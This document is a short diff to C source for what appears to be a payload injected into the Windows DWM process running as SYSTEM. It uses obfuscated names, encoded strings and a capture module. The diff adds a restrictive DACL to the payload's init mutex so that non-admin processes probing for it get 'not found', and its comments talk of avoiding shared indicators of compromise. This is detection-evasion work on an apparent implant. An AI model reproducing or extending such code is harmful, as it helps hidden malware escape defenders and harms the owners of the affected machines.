@@ -28,6 +28,7 @@
 #include "../../shared/handshake.h"
 #include "../../shared/str_enc.h"
 #include "../../shared/obf_names.h"
+#include "../../shared/sec_attr.h"
 #include "config_read.h"
 #include "blob_read.h"
 #include "capture.h"
@@ -1995,8 +1996,19 @@ static DWORD WINAPI init_thread(LPVOID param) {
      * session BaseNamedObjects directory by any non-admin process. Both
      * injected copies on the same box derive the SAME name from
      * MachineGuid, so the double-init guard still works; a different box
-     * gets a different name (no shared cross-install IOC). */
-    g_init_mutex = CreateMutexA(NULL, FALSE, obf_mutex_initguard());
+     * gets a different name (no shared cross-install IOC).
+     *
+     * v3.2 (2026-09-23): Admins+SYSTEM DACL. Only DWM's payload (SYSTEM)
+     * needs to open this mutex -- second-instance detection is same-DWM
+     * (also SYSTEM). Explicit DACL closes the medium-IL existence-probe
+     * gap (attacker with derived name got EXISTS_ACCESS_DENIED before;
+     * now gets NOT_FOUND). */
+    SECURITY_ATTRIBUTES imx_sa = {0};
+    PSECURITY_DESCRIPTOR imx_sd = NULL;
+    int imx_have_sa = svc_build_admin_sys_sa(&imx_sa, &imx_sd);
+    g_init_mutex = CreateMutexA(imx_have_sa ? &imx_sa : NULL, FALSE,
+                                obf_mutex_initguard());
+    if (imx_sd) LocalFree(imx_sd);
     DWORD init_mutex_gle = GetLastError();
     if (init_mutex_gle == ERROR_ALREADY_EXISTS) {
         slog_write("payload.log",
